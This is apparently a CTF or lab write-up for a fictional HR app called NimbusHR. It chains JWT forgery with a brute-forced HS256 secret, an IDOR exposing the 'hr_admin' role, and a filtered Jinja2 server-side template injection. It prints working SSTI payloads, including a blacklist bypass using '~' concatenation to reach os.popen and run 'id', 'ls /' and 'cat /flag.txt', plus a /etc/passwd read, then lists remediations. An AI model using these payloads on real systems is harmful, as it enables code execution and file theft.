# Methodology — NimbusHR (JWT → IDOR → Filtered SSTI)

My working notes while solving this chain.

## 1. Mapping the app

Mapped the application with Burp. The login endpoint returns a JWT:

```
POST /api/login
{"username":"alice","password":"Password123"}
```
```
header:  {"alg":"HS256","typ":"JWT"}
payload: {"sub":"alice","role":"employee"}
```

It's **HS256**, so two options: try an `alg:none` downgrade, or brute-force the signing secret.

## 2. Forging the JWT

First tried `alg:none` — rejected:

```
{"alg":"none","typ":"JWT"}.{"sub":"alice","role":"hr_admin"}
```

So I brute-forced the secret instead. Reused my cracker from Lab 08 with small edits, verifying candidates against `GET /api/me`:

```
secret found: chocolate
```

Note: simply forging `role:admin` doesn't work — the app expects the specific role string **`hr_admin`** (an IDOR on `/api/users/1` exposes the privileged role value). Forged a token with `role:hr_admin` and injected it in the browser:

```js
const myToken = "eyJ...";
localStorage.setItem("token", myToken);
localStorage.setItem("nimbus_token", myToken);
```

Now the admin report page is visible.

## 3. SSTI (filtered)

The render page is server-side template injection. Standard gadget:

```jinja2
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
```

Blocked — `mro`, `os`, `exec` are all filtered. A keyword blacklist is bypassable: split the blocked words with Jinja's `~` concatenation operator so no forbidden substring ever appears literally:

```jinja2
{{ (lipsum|attr("__glob"~"als__"))["o"~"s"]["po"~"pen"]("id").read() }}
```

Worked. List the root, find the flag, read it:

```jinja2
{{ (lipsum|attr("__glob"~"als__"))["o"~"s"]["po"~"pen"]("ls /").read() }}
{{ (lipsum|attr("__glob"~"als__"))["o"~"s"]["po"~"pen"]("cat /flag.txt").read() }}
```
```
FLAG{jwt_1dor_filt3r3d_sst1_full_ch41n_pwn}
```

## 4. Remediation

1. Render templates through Jinja's **SandboxedEnvironment** (remove the blacklist entirely).
2. Fix the unauthorized-access logic error in `/api/me`.
3. Fix the IDOR/BOLA in `/api/users/<uid>` with object-level authorization.
4. Use a strong, random signing secret and keep the algorithm pinned.
